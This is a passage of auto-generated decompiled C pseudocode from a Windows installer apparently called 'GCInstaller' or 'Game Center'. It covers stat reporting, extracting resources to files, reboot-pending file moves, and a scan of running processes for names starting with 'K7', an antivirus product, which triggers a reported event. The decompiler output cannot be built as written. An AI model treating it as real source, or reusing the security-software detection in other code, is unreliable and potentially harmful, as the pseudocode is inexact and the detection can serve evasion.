// 4594AC: using guessed type int dword_4594AC;
// 467E40: using guessed type __int64 qword_467E40;
// 46F6C0: using guessed type int dword_46F6C0;

//----- (004594B0) --------------------------------------------------------
int __usercall sub_4594B0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  if ( !qword_467E48 )
    qword_467E48 = sub_4591C0(a1, a2, a3);
  return unknown_libname_75(qword_467E48, HIDWORD(qword_467E48));
}
// 4151D0: using guessed type _DWORD __stdcall unknown_libname_75(_DWORD, _DWORD);
// 467E48: using guessed type __int64 qword_467E48;

//----- (00459500) --------------------------------------------------------
_DWORD *__usercall sub_459500@<eax>(volatile __int32 *a1@<eax>, int a2)
{
  _DWORD *result; // eax
  int v3; // [esp+0h] [ebp-Ch]
  int i; // [esp+4h] [ebp-8h]

  v3 = Strutils::PosEx(dword_4595D8, *(_DWORD *)(a2 - 4), 1);
  if ( !v3 )
    return sub_406C68(a1);
  if ( v3 > 1800 )
    v3 = 1801;
  sub_407510(*(_DWORD *)(a2 - 4), 1, v3 - 1, a1);
  result = (_DWORD *)Strutils::PosEx(dword_4595E8, *a1, 1);
  if ( result )
  {
    sub_407570(a1, 1, (int)result + 1);
    for ( i = 0; i != 3; ++i )
    {
      result = (_DWORD *)Strutils::PosEx(&str___18[1], *a1, 1);
      if ( !result )
        break;
      result = sub_407570(a1, 1, (int)result);
    }
  }
  return result;
}
// 407C4C: using guessed type int __fastcall Strutils::PosEx(_DWORD, _DWORD, _DWORD);
// 4595D8: using guessed type int dword_4595D8[4];
// 4595E8: using guessed type int dword_4595E8[2];
// 4595F0: using guessed type _strings str___18[1];

//----- (00459600) --------------------------------------------------------
int __usercall sub_459600@<eax>(int a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  unsigned int v5; // [esp-30h] [ebp-54h]
  _DWORD v6[3]; // [esp-Ch] [ebp-30h] BYREF
  void *v7; // [esp+0h] [ebp-24h] BYREF
  int v8; // [esp+4h] [ebp-20h] BYREF
  int System__WideString; // [esp+8h] [ebp-1Ch] BYREF
  unsigned int v10; // [esp+Ch] [ebp-18h] BYREF
  int v11; // [esp+10h] [ebp-14h] BYREF
  int v12; // [esp+14h] [ebp-10h] BYREF
  int v13; // [esp+18h] [ebp-Ch] BYREF
  void *v14; // [esp+1Ch] [ebp-8h] BYREF
  int v15; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v15 = a1;
  v6[2] = &savedregs;
  v6[1] = &loc_459741;
  v6[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v6);
  sub_459980((int)cls_MiniStatUtil_TInstallerStatRootSender, &v13, a2, a3, a4);
  sub_415150(1569, &v12);
  sub_415150(53606, &v11);
  sub_459500((volatile __int32 *)&v7, (int)&savedregs);
  sub_40732C(&v8, "GCInstaller: ", v7);
  sub_451000(v8, &System__WideString);
  System::UTF8Encode(System__WideString);
  v5 = v10;
  sub_4079F0((int *)&v14, 9);
  if ( byte_467E50 )
    sub_407968((volatile __int32 *)&v14, off_467E34, v14);
  else
    sub_407968((volatile __int32 *)&v14, off_467E38, v14);
  if ( sub_425ED0(4u, 0) )
    sub_407968((volatile __int32 *)&v14, off_467E28, v14);
  else
    sub_407968((volatile __int32 *)&v14, off_467E24, v14);
  sub_458340((int)v14, v15, 0, 0, 0);
  __writefsdword(0, v5);
  sub_406CD4((int)&v7, 3);
  return sub_406CA4((int)&v10, 5);
}
// 457FAC: using guessed type int (*cls_MiniStatUtil_TInstallerStatRootSender[3])();
// 467E50: using guessed type char byte_467E50;

//----- (00459810) --------------------------------------------------------
_DWORD *__fastcall sub_459810(int a1, char a2, char a3)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  char v6; // [esp+2h] [ebp-6h]
  char v7; // [esp+3h] [ebp-5h]
  int v8; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = a3;
  v7 = a2;
  v8 = a1;
  System::__linkproc__ LStrAddRef(a1);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_459868;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_406FE8((volatile __int32 *)&off_467E3C, v8);
  byte_467E50 = v7;
  byte_46F6C8 = v6;
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_45986F;
  return sub_406C44(&v8);
}
// 406D28: using guessed type int __fastcall System::__linkproc__ LStrAddRef(_DWORD);
// 467E3C: using guessed type int (*off_467E3C)[2];
// 467E50: using guessed type char byte_467E50;
// 46F6C8: using guessed type char byte_46F6C8;

//----- (004598E0) --------------------------------------------------------
int sub_4598E0()
{
  __int64 v0; // rax
  int result; // eax
  char v2; // [esp+3h] [ebp-5h]
  int v3; // [esp+4h] [ebp-4h]

  v0 = System::__linkproc__ BeforeDestruction();
  v2 = BYTE4(v0);
  v3 = v0;
  byte_46F6B0 = 0;
  result = sub_452D50();
  if ( v2 > 0 )
    return System::__linkproc__ ClassDestroy(v3);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 46F6B0: using guessed type char byte_46F6B0;

//----- (00459920) --------------------------------------------------------
_DWORD *__fastcall sub_459920(int a1, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6)
{
  if ( a4 )
    *a4 = 0;
  if ( a5 )
    *a5 = 0;
  if ( a6 )
    *a6 = 0;
  *a3 = 0;
  sub_406C68(a4);
  sub_406C68(a5);
  return sub_406C68(a6);
}

//----- (00459980) --------------------------------------------------------
int __usercall sub_459980@<eax>(int a1@<eax>, int *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  unsigned int v6; // [esp-44h] [ebp-64h]
  _DWORD v7[3]; // [esp-Ch] [ebp-2Ch] BYREF
  unsigned int v8; // [esp+0h] [ebp-20h] BYREF
  int v9[2]; // [esp+4h] [ebp-1Ch] BYREF
  int v10; // [esp+Ch] [ebp-14h] BYREF
  int v11; // [esp+10h] [ebp-10h] BYREF
  int v12; // [esp+14h] [ebp-Ch] BYREF
  int *v13; // [esp+18h] [ebp-8h]
  int v14; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v10 = 0;
  v9[1] = 0;
  v9[0] = 0;
  v8 = 0;
  v13 = a2;
  v14 = a1;
  v7[2] = &savedregs;
  v7[1] = &loc_459A55;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_415150(1569, &v12);
  sub_415150(53606, &v11);
  sub_459130((DWORD)&v10, a3, a4, a5);
  sub_4594B0(a3, a4, a5);
  sub_415150((unsigned __int8)byte_46F6C8, v9);
  Strutils::IfThen(&v8);
  v6 = v8;
  sub_4079F0(v13, 14);
  __writefsdword(0, v6);
  return sub_406CA4((int)&v8, 6);
}
// 4248E0: using guessed type _DWORD __stdcall Strutils::IfThen(_DWORD);
// 46F6C8: using guessed type char byte_46F6C8;

//----- (00459B70) --------------------------------------------------------
_DWORD *__fastcall sub_459B70(int a1, int a2, _DWORD *a3)
{
  return sub_406C44(a3);
}

//----- (00459B90) --------------------------------------------------------
__int64 sub_459B90()
{
  return 500i64;
}

//----- (00459BC0) --------------------------------------------------------
int __usercall sub_459BC0@<eax>(int *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  unsigned int v6; // [esp-18h] [ebp-2Ch]
  _DWORD v7[3]; // [esp-Ch] [ebp-20h] BYREF
  unsigned int v8; // [esp+0h] [ebp-14h] BYREF
  BOOL *v9; // [esp+4h] [ebp-10h] BYREF
  void *v10; // [esp+8h] [ebp-Ch] BYREF
  volatile __int32 *v11; // [esp+Ch] [ebp-8h]
  int *v12; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v10 = 0;
  v9 = 0;
  v8 = 0;
  v11 = a2;
  v12 = a1;
  v7[2] = &savedregs;
  v7[1] = &loc_459C81;
  v7[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( byte_467E50 )
    sub_407030((volatile __int32 *)&v10, (__int32)off_467E2C[0]);
  else
    sub_407030((volatile __int32 *)&v10, (__int32)off_467E30[0]);
  if ( sub_425ED0(4u, 0) )
    sub_407968((volatile __int32 *)&v10, off_467E28, v10);
  else
    sub_407968((volatile __int32 *)&v10, off_467E24, v10);
  sub_459980(*v12, (int *)&v8, a3, a4, a5);
  v6 = v8;
  sub_4079F0((int *)&v9, 3);
  sub_40B238(v9, v11);
  __writefsdword(0, v6);
  return sub_406CA4((int)&v8, 3);
}
// 467E2C: using guessed type wchar_t *off_467E2C[4];
// 467E30: using guessed type wchar_t *off_467E30[3];
// 467E50: using guessed type char byte_467E50;

//----- (00459CE0) --------------------------------------------------------
char __usercall sub_459CE0@<al>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int *v3; // eax

  if ( !byte_46F6B0 )
    return 0;
  if ( !sub_4582B0() )
    return 0;
  v3 = (int *)sub_4582B0();
  sub_452E90(v3, 0, a1, a2, a3);
  return 1;
}
// 46F6B0: using guessed type char byte_46F6B0;

//----- (00459D20) --------------------------------------------------------
char __usercall sub_459D20@<al>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  int v4; // eax
  int v5; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v8; // [esp-8h] [ebp-24h]
  int *v9; // [esp-4h] [ebp-20h]
  void *v10; // [esp+0h] [ebp-1Ch]
  int v11; // [esp+4h] [ebp-18h] BYREF
  int v12; // [esp+8h] [ebp-14h] BYREF
  char v13; // [esp+Fh] [ebp-Dh]
  int v14; // [esp+10h] [ebp-Ch]
  int System__WideString; // [esp+14h] [ebp-8h]
  struct _EXCEPTION_REGISTRATION_RECORD *v16; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  v11 = 0;
  v12 = 0;
  v14 = a3;
  System__WideString = a2;
  v16 = (struct _EXCEPTION_REGISTRATION_RECORD *)a1;
  v9 = &savedregs;
  v8 = &loc_459DFC;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_406C68(&v12);
  v4 = (***(int (__fastcall ****)(_DWORD, _DWORD))(v14 + 4))(*(_DWORD *)(v14 + 4), **(_DWORD **)(v14 + 4));
  sub_4075BC(&v12, v4, 0);
  Classes::TStream::SetPosition(*(Classes::TStream **)(v14 + 4), 0i64);
  if ( v12 )
  {
    ExceptionList = (struct _EXCEPTION_REGISTRATION_RECORD *)(***(int (__fastcall ****)(_DWORD))(v14 + 4))(*(_DWORD *)(v14 + 4));
    v5 = sub_4071C8(&v12);
    sub_4275A0(*(_DWORD *)(v14 + 4), v5, (int)ExceptionList, a4);
  }
  ExceptionList = v16;
  System::UTF8Encode(System__WideString);
  if ( !sub_458340(v11, v12, v14, (int)ExceptionList, (int)sub_453530) )
  {
    sub_40C490(&dword_46F6B4);
    if ( dword_46F6B4 >= 10 )
      byte_46F6B0 = 0;
  }
  v13 = 1;
  __writefsdword(0, (unsigned int)v8);
  v10 = &loc_459E03;
  sub_406C44(&v11);
  sub_406C68(&v12);
  return v13;
}
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 46F6B0: using guessed type char byte_46F6B0;
// 46F6B4: using guessed type int dword_46F6B4;

//----- (00459E10) --------------------------------------------------------
_DWORD *__usercall sub_459E10@<eax>(int *a1@<eax>, int a2@<ebx>, int a3@<edi>, int a4@<esi>)
{
  unsigned int v5[2]; // [esp-18h] [ebp-20h] BYREF
  int *v6; // [esp-10h] [ebp-18h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-14h] BYREF
  void *v8; // [esp-8h] [ebp-10h]
  int *v9; // [esp-4h] [ebp-Ch]
  const WCHAR *v10; // [esp+0h] [ebp-8h] BYREF
  int *v11; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v10 = 0;
  v11 = a1;
  v9 = &savedregs;
  v8 = &loc_459E99;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_405514(*a1, (int)&v10);
  sub_427100(v10);
  v6 = &savedregs;
  v5[1] = (unsigned int)&loc_459E7C;
  v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  while ( sub_459CE0(a2, a3, a4) )
    Sleep_1(0x32u);
  __writefsdword(0, v5[0]);
  (*(void (__fastcall **)(int *, int, int *, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *, void *))(*v11 + 4))(
    v11,
    *v11,
    v6,
    v9,
    v8,
    ExceptionList,
    &loc_459E83);
  __writefsdword(0, (unsigned int)v8);
  v10 = (const WCHAR *)&loc_459EA0;
  return sub_406C44(&v10);
}

//----- (00459EB0) --------------------------------------------------------
int sub_459EB0()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_459EF5;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_46F6B8 )
  {
    sub_406C44(&off_467E3C);
    sub_406C44(&dword_46F6C0);
    sub_406C44(&dword_46F6C4);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 467E3C: using guessed type int (*off_467E3C)[2];
// 46F6B8: using guessed type int dword_46F6B8;
// 46F6C0: using guessed type int dword_46F6C0;

//----- (0045A110) --------------------------------------------------------
_DWORD *__fastcall sub_45A110(int *a1)
{
  unsigned int v2; // [esp-18h] [ebp-20h]
  _DWORD v3[3]; // [esp-Ch] [ebp-14h] BYREF
  unsigned int v4; // [esp+0h] [ebp-8h] BYREF
  int *v5; // [esp+4h] [ebp-4h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v4 = 0;
  v5 = a1;
  v3[2] = &savedregs;
  v3[1] = &loc_45A18B;
  v3[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  if ( byte_467E7C )
    sub_406FE8(v5, (int)L"Game Center");
  else
    sub_406FE8(v5, (int)dword_45A1C8);
  sub_4516A0(0, (volatile __int32 *)&v4);
  v2 = v4;
  sub_4079F0(v5, 3);
  __writefsdword(0, v2);
  return sub_406C44(&v4);
}
// 45A1A4: using guessed type wchar_t aGameCenter[12];
// 45A1C8: using guessed type int dword_45A1C8[10];
// 467E7C: using guessed type char byte_467E7C;

//----- (0045A200) --------------------------------------------------------
int __usercall sub_45A200@<eax>(int a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  int v3; // eax
  int v5; // [esp+0h] [ebp-Ch] BYREF
  int v6; // [esp+4h] [ebp-8h]
  int v7; // [esp+8h] [ebp-4h]

  v6 = a2;
  v7 = a1;
  v5 = 0;
  sub_4275A0(a1, (int)&v5, 1, a3);
  if ( v5 == 255 )
    sub_4275A0(v7, (int)&v5, 4, a3);
  sub_4075BC((_DWORD *)v6, v5, 0);
  v3 = sub_4071C8(v6);
  return sub_4275A0(v7, v3, v5, a3);
}
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);

//----- (0045A260) --------------------------------------------------------
_DWORD *__fastcall sub_45A260(char a1, int *a2)
{
  int *v2; // eax
  BOOL *v4; // [esp-44h] [ebp-288h]
  unsigned int v5[2]; // [esp-18h] [ebp-25Ch] BYREF
  int *v6; // [esp-10h] [ebp-254h]
  unsigned int v7[2]; // [esp-Ch] [ebp-250h] BYREF
  int *v8; // [esp-4h] [ebp-248h]
  PROCESSENTRY32W pe; // [esp+0h] [ebp-244h] BYREF
  char v10; // [esp+22Fh] [ebp-15h]
  BOOL *v11; // [esp+230h] [ebp-14h] BYREF
  bool v12; // [esp+237h] [ebp-Dh]
  HANDLE hSnapshot; // [esp+238h] [ebp-Ch]
  int *v14; // [esp+23Ch] [ebp-8h]
  char v15; // [esp+243h] [ebp-1h]
  int savedregs; // [esp+244h] [ebp+0h] BYREF

  v11 = 0;
  v14 = a2;
  v15 = a1;
  v8 = &savedregs;
  v7[1] = (unsigned int)System::__linkproc__ HandleFinally;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  sub_406C44(a2);
  hSnapshot = CreateToolhelp32Snapshot(2u, 0);
  if ( hSnapshot != (HANDLE)-1 )
  {
    v6 = &savedregs;
    v5[1] = (unsigned int)System::__linkproc__ HandleFinally;
    v5[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    Guitesting::TGUITestCase::Hide(&pe, 556);
    pe.dwSize = 556;
    v12 = Process32FirstW(hSnapshot, &pe);
    v10 = 0;
    while ( v12 )
    {
      unknown_libname_51(&v11, pe.szExeFile, 260);
      if ( v15
        && !v10
        && (unsigned __int8)sub_424040((int)L"K7", (int)v11, 0)
        && (unsigned __int8)sub_424110((int)L".exe", (int)v11, 0) )
      {
        v4 = v11;
        v2 = (int *)sub_4582B0();
        sub_4521B0(v2, 858, (__int32)&dword_46F6D4, 0i64, 0i64, 0i64, 0i64, 0i64, v4);
        v10 = 1;
      }
      sub_4079F0(v14, 3);
      v12 = Process32NextW(hSnapshot, &pe);
    }
    __writefsdword(0, v5[0]);
    v6 = (int *)&loc_45A3BA;
    CloseHandle_0(hSnapshot);
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_45A3D7;
  return sub_406C44(&v11);
}
// 407824: using guessed type int __fastcall unknown_libname_51(_DWORD, _DWORD, _DWORD);
// 4237B0: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 45A3B3: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 45A3D0: using guessed type int __cdecl System::__linkproc__ HandleFinally(int, int);
// 45A3E8: using guessed type wchar_t aK7[3];
// 45A3FC: using guessed type wchar_t aExe[5];
// 46F6D4: using guessed type int dword_46F6D4;
// 45A260: using guessed type BOOL *var_14;

//----- (0045A420) --------------------------------------------------------
_DWORD *__usercall sub_45A420@<eax>(
        Classes::TStream *a1@<eax>,
        int a2@<edx>,
        int a3@<edi>,
        int a4@<esi>,
        long double a5@<st0>)
{
  int v5; // ecx
  __int64 v6; // rax
  _DWORD v8[3]; // [esp-24h] [ebp-44h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *v9; // [esp-18h] [ebp-38h] BYREF
  void *v10; // [esp-14h] [ebp-34h]
  int *v11; // [esp-10h] [ebp-30h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-2Ch] BYREF
  void *v13; // [esp-8h] [ebp-28h]
  int *v14; // [esp-4h] [ebp-24h]
  void *v15; // [esp+0h] [ebp-20h]
  int v16; // [esp+Ch] [ebp-14h] BYREF
  _DWORD *v17; // [esp+14h] [ebp-Ch]
  int v18; // [esp+18h] [ebp-8h]
  Classes::TStream *v19; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v16 = 0;
  v18 = a2;
  v19 = a1;
  v14 = &savedregs;
  v13 = &loc_45A52A;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v17 = (_DWORD *)sub_425590(a2, 0);
  if ( v17 )
  {
    v11 = &savedregs;
    v10 = &loc_45A50D;
    v9 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v9);
    Classes::TStream::SetPosition(v19, 0i64);
    v8[2] = &savedregs;
    v8[1] = &loc_45A4B1;
    v8[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v8);
    v6 = ((__int64 (__fastcall *)(Classes::TStream *, _DWORD, int, void *, _DWORD))**(_DWORD **)v19)(
           v19,
           *(_DWORD *)v19,
           v5,
           &loc_45A4B1,
           v8[0]);
    sub_427690(v17, (int *)v19, v6);
    sub_44CFE0((void *)v17[1], 1, 1, a3, a4, a5);
    __writefsdword(0, (unsigned int)v10);
    __writefsdword(0, (unsigned int)v13);
    v15 = &loc_45A514;
    sub_405598(v17);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v14 = (int *)&loc_45A531;
  return sub_406C44(&v16);
}
// 45A486: variable 'v5' is possibly undefined

//----- (0045A560) --------------------------------------------------------
int __fastcall sub_45A560(int a1, int a2)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-28h] BYREF
  int *v4; // [esp-4h] [ebp-20h]
  void *v5; // [esp+0h] [ebp-1Ch] BYREF
  int v6; // [esp+4h] [ebp-18h] BYREF
  __int32 v7; // [esp+8h] [ebp-14h] BYREF
  void *v8; // [esp+Ch] [ebp-10h] BYREF
  int i; // [esp+10h] [ebp-Ch]
  int v10; // [esp+14h] [ebp-8h]
  int v11; // [esp+18h] [ebp-4h]
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  i = 0;
  v8 = 0;
  v7 = 0;
  v6 = 0;
  v5 = 0;
  v10 = a2;
  v11 = a1;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_45A60D;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_4253F0(a1, &v6);
  sub_4252A0(v6, &v7);
  sub_4253F0(v7, &v8);
  sub_4254A0(v11, &v5);
  sub_407968((volatile __int32 *)v10, v8, v5);
  for ( i = 1; i != 11; ++i )
  {
    sub_407910((volatile __int32 *)v10, dword_45A624);
    sub_426BB0(*(_DWORD *)v10);
    if ( !(unsigned __int8)sub_426B00(*(_DWORD *)v10) )
      break;
  }
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_45A614;
  return sub_406CA4((int)&v5, 4);
}
// 45A624: using guessed type int dword_45A624[3];

//----- (0045A630) --------------------------------------------------------
int __usercall sub_45A630@<eax>(void *a1@<eax>, char a2@<dl>, int a3@<edi>, int a4@<esi>, long double a5@<st0>)
{
  int v5; // eax
  int v6; // edx
  int v7; // eax
  const WCHAR *v8; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-38h] BYREF
  void *v11; // [esp-14h] [ebp-34h]
  int *v12; // [esp-10h] [ebp-30h]
  unsigned int v13[2]; // [esp-Ch] [ebp-2Ch] BYREF
  int *v14; // [esp-4h] [ebp-24h]
  int v15; // [esp+0h] [ebp-20h]
  int v16; // [esp+4h] [ebp-1Ch]
  __int32 v17; // [esp+8h] [ebp-18h] BYREF
  int v18; // [esp+Ch] [ebp-14h] BYREF
  int v19; // [esp+10h] [ebp-10h] BYREF
  Classes::TStream *v20; // [esp+14h] [ebp-Ch]
  char v21; // [esp+1Bh] [ebp-5h]
  void *v22; // [esp+1Ch] [ebp-4h]
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  v19 = 0;
  v18 = 0;
  v17 = 0;
  v21 = a2;
  v22 = a1;
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_45A784;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  sub_407030(&v17, (__int32)a1);
  v5 = System::__linkproc__ LStrLen(v17);
  if ( v5 > 0 )
  {
    v15 = v5;
    v16 = 1;
    do
    {
      v6 = v16;
      if ( *(_WORD *)(v17 + 2 * v16 - 2) == 64 )
      {
        v7 = sub_4071C0(&v17);
        v6 = v16;
        *(_WORD *)(v7 + 2 * v16 - 2) = 46;
      }
      ++v16;
      --v15;
    }
    while ( v15 );
  }
  LOBYTE(v6) = 1;
  v20 = (Classes::TStream *)Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(
                              &cls_CrossPlatform_TResourceStream,
                              v6,
                              hModule,
                              v17,
                              10);
  v12 = &savedregs;
  v11 = &loc_45A762;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_407968(&v19, dword_46F6F8, v22);
  if ( !(unsigned __int8)sub_426B00(v19) )
    goto LABEL_13;
  if ( v21 || sub_4255C0(v19, 0) <= 0 )
  {
    if ( !sub_426BB0(v19) )
    {
      sub_45A560(v19, (int)&v18);
      if ( sub_426B80(v19, v18) )
      {
        v8 = (const WCHAR *)sub_407790(v18);
        MoveFileExW(v8, 0, 4u);
      }
    }
LABEL_13:
    sub_45A420(v20, v19, a3, a4, a5);
    __writefsdword(0, (unsigned int)ExceptionList);
    v12 = (int *)&loc_45A769;
    sub_405598(v20);
    goto LABEL_14;
  }
  System::__linkproc__ TryFinallyExit(ExceptionList, v11, v12);
LABEL_14:
  __writefsdword(0, v13[0]);
  v14 = (int *)&loc_45A78B;
  return sub_406CA4((int)&v17, 3);
}
// 45A6B1: variable 'v6' is possibly undefined
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 42286C: using guessed type int (*cls_CrossPlatform_TResourceStream)();
// 427C00: using guessed type _DWORD __fastcall Dbxmetadatareader::TDBXBaseMetaDataReader::TDBXDataTypeCursor::TDBXDataTypeCursor(_DWORD, _DWORD, HMODULE hModule, _DWORD, _DWORD);

//----- (0045A790) --------------------------------------------------------
int __usercall sub_45A790@<eax>(
        int *a1@<eax>,
        void *a2@<edx>,
        __int32 a3@<ecx>,
        BOOL a4@<ebx>,
        int a5@<edi>,
        int a6@<esi>,
        long double a7@<st0>)
{
  char v7; // zf
  __int64 v8; // rax
  unsigned int v10[2]; // [esp-24h] [ebp-58h] BYREF
  int *v11; // [esp-1Ch] [ebp-50h]
  int v12; // [esp-18h] [ebp-4Ch]
  int v13; // [esp-14h] [ebp-48h]
  void *v14; // [esp-10h] [ebp-44h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-40h] BYREF
  void *v16; // [esp-8h] [ebp-3Ch]
  int *v17; // [esp-4h] [ebp-38h]
  void *v18; // [esp+0h] [ebp-34h]
  int v19; // [esp+4h] [ebp-30h] BYREF
  int v20; // [esp+8h] [ebp-2Ch] BYREF
  int v21; // [esp+Ch] [ebp-28h] BYREF
  int v22; // [esp+10h] [ebp-24h] BYREF
  int v23; // [esp+14h] [ebp-20h] BYREF
  int v24; // [esp+18h] [ebp-1Ch] BYREF
  void *v25; // [esp+1Ch] [ebp-18h] BYREF
  Classes::TStream *v26; // [esp+20h] [ebp-14h]
  int v27; // [esp+24h] [ebp-10h] BYREF
  char v28; // [esp+2Bh] [ebp-9h]
  void *v29; // [esp+2Ch] [ebp-8h]
  int *v30; // [esp+30h] [ebp-4h] BYREF
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  v28 = _InterlockedExchange((volatile __int32 *)&v30, a3);
  v29 = a2;
  v30 = a1;
  v17 = &savedregs;
  v16 = &loc_45A946;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  v27 = 0;
  sub_4275A0((int)a1, (int)&v27, 4, a5);
  sub_45A200((int)v30, (int)&v23, a5);
  v14 = dword_46F6F8;
  sub_407840(&v22, v23, (int)v29);
  v12 = v22;
  sub_4079F0((int *)&v25, 3);
  if ( !v28
    || (sub_407510(v23, 1, 8, &v20),
        sub_4245B0((_BYTE *)v20, (unsigned __int8 **)&v21),
        sub_407478(v21, (int)"gameicon"),
        v7) )
  {
    sub_407968(&v19, dword_46F6F8, v29);
    sub_425600(v19, a4, a6);
    v26 = (Classes::TStream *)sub_405568((int)&cls_CrossPlatform_TMemoryStream, 1);
    v11 = &savedregs;
    v10[1] = (unsigned int)&loc_45A8FC;
    v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v10);
    if ( v27 > 0 )
      sub_427690(v26, v30, v27);
    if ( (unsigned __int8)sub_426B00((int)v25) )
    {
      sub_426BB0((int)v25);
      if ( (unsigned __int8)sub_426B00((int)v25) )
      {
        sub_407968(&v24, v25, dword_45A978);
        sub_426BB0(v24);
        sub_426B80((int)v25, v24);
      }
    }
    sub_45A420(v26, (int)v25, a5, a6, a7);
    __writefsdword(0, v10[0]);
    v11 = (int *)&loc_45A903;
    sub_405598(v26);
  }
  else
  {
    v8 = v27;
    BYTE4(v8) = 1;
    (*(void (__fastcall **)(int *, _DWORD, _DWORD, void *, int, int, int, int))(*v30 + 20))(
      v30,
      HIDWORD(v8),
      *v30,
      v14,
      v13,
      v12,
      v27 >> 31,
      v27);
  }
  __writefsdword(0, (unsigned int)v16);
  v18 = &loc_45A94D;
  sub_406C44(&v19);
  sub_406C68(&v20);
  sub_406C68(&v21);
  sub_406C44(&v22);
  sub_406C68(&v23);
  return sub_406CA4((int)&v24, 2);
}
// 45A834: variable 'v7' is possibly undefined
// 4227A8: using guessed type int (*cls_CrossPlatform_TMemoryStream)();
// 45A978: using guessed type int dword_45A978[2];
// 45A790: using guessed type int var_10;

//----- (0045A980) --------------------------------------------------------
int __usercall sub_45A980@<eax>(_DWORD **a1@<edi>)
{
